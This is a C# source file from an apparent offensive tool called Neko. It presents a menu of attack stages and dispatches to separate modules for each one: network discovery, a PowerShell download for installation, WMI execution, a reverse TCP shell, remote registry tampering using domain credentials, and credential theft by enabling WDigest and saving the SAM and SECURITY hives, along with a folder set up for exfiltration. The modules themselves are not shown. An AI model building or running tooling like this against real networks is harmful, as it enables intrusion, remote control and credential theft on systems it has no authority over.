using System;

namespace Neko.UserChoices
{
    class AttackType
    {
        public static string attackType = string.Empty;

        public static string Selection()
        {
            // Prompt user decision on recon or deployment via WMI
            Console.WriteLine("\r\nNeko Attack Options: \r\n\r\n 1: Discovery \r\n\r\n 2: Installation \r\n\r\n 3: Execution via WMI \r\n\r\n 4: Command and Control" +
                "\r\n\r\n 5: Remote Registry Tampering \r\n\r\n 6: Credential Access");
            Console.WriteLine("\r\nMake your selection:");
            attackType = Console.ReadLine();
            while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4" && attackType!= "5" && attackType != "6")
            {
                Console.WriteLine("\r\nInvalid selection. 1: Discovery \r\n\r\n 2: Installation \r\n\r\n 3: Execution via WMI \r\n\r\n 4: Command and Control" +
                "\r\n\r\n 5: Remote Registry Tampering \r\n\r\n 6: Credential Access");
                attackType = Console.ReadLine();
            }

            // Set save location for data exfiltration
            string nekoFolder = Exfiltration.SaveLocations.SetPath();

            LaunchAttack(attackType);
            return attackType;
        }

        // Launch specified attack
        public static void LaunchAttack(string attackType)
        {
            switch (attackType)
            {
                case "1":
                    DiscoveryChoice.Selections();
                    break;
                case "2":
                    Delivery.PowerShell.DownloadFile();
                    break;
                case "3":
                    Execution.WMIDeployment.Deploy();
                    break;
                case "4":
                    Command_and_Control.ReverseTCPShell.Control();
                    break;
                case "5":
                    RemoteRegistry.RegModification(Exfiltration.SaveLocations.NekoFolder, GetDomainInfo.DomainURL, DomainAuthentication.Username, DomainAuthentication.Password);
                    break;
                case "6":
                    Credential_Access.Selections.EnableWDigest();
                    Credential_Access.Selections.SaveSAMSecurity();
                    break;
            }
        }
    }
}
